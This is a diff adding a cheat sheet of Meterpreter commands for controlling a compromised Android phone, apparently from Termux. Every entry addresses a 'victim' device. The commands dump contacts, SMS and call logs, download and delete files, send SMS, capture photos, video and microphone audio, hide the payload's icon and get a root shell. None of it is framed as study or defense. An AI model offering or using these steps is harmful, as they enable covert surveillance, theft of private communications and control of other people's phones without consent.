@@ -1,0 +1,76 @@
+Commands for meterperter session:
+[1] To get an help window
+--> meterpreter > help
+
+[2] To check the system info
+--> meterpreter > sys_info
+
+[3] To check whether the deice is rooted or not
+--> meterpreter > check_root
+
+[4] To upload a file into his internal storage
+--> meterpreter > cd /storage/emulated/0
+--> meterpreter > ls
+--> meterpreter > upload (path to the file)
+
+[5] To send an sms from the victim device
+--> meterpreter > send_sms -d <destination number> -t "text"
+For ex.: send_sms -d 9887823789 -t "Hello!!! "
+
+[6] To get all the contacts from the victim
+--> meterpreter > dump_contacts 
+* The contacts list will be stored in termux home directory
+
+[7] To get all sms from the victim
+--> meterpreter > dump_sms
+* The list will be stored in termux home directory
+
+[8] To get the call log of victim
+--> meterpreter > dump_calllog
+* The list will be stored in termux home directory
+
+[9] To download a file from victim
+--> meterpreter > download <path to file in the victim>
+
+[10] To delete a file from victim
+--> meterpreter > rm <path to file>
+--> meterpreter > rm -rf <path to a folder>
+
+[11] To search a type of file extension in victim
+--> meterpreter > search -f *<file extension>
+For ex.: search -f *.mp3 // Lists all songs from victim device
+
+[12] To get the list of app installed in victim
+--> meterpreter > app_list
+
+[13] To run a app in the victim device
+--> meterpreter > app_run <app name>
+For ex.: app_run com.whatsapp // Runs whatsapp in device
+
+[14] To uninstall a app from victim device
+--> meterpreter > app_uninstall <app name>
+Fpor ex.: app_uninstall com.whatsapp 
+
+[15] To get the list of camaras in victim device
+--> meterpreter > webcam_list
+Outputs : 1) Back Cam
+               2) Front Cam
+
+[16] To get an image from victims camera
+--> meterpreter > webcam_snap 1 // Snaps an image from victims back cam
+* The image will be stored at termux home directory
+
+[17] To Record a video from victim device
+--> meterpreter > webcam_stream
+--> Ctrl+C to end
+
+[18] To record voice from the victims microphone
+--> meterpreter > record_mic -d <duration in seconds>
+
+[19] To hide the payload in victim device
+--> meterpreter > hide_app_icon
+
+[20] If the device is rooted the type :
+-->  meterpreter > shell 
+--> meterpreter > su
+* To get the permission to root directory 
